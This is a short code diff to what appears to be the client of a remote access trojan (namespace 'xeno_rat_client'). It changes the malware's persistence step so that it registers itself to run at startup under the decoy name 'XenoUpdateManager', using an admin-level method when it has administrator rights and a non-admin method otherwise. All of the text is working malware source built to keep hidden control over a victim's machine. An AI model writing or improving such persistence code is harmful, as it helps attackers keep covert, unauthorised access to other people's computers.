@@ -61,13 +61,21 @@ namespace xeno_rat_client
                 return;
             }
             await Task.Delay(delay);
-            if (DoStartup==1) 
+            if (DoStartup == 1)
             {
-                if (startup_name == "nothingset") 
+                if (startup_name == "nothingset")
                 {
                     startup_name = "XenoUpdateManager";
                 }
-                Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                if (Utils.IsAdmin())
+                {
+                    await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                }
+                else 
+                {
+                    await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                }
+                
             }
             while (true)
             {
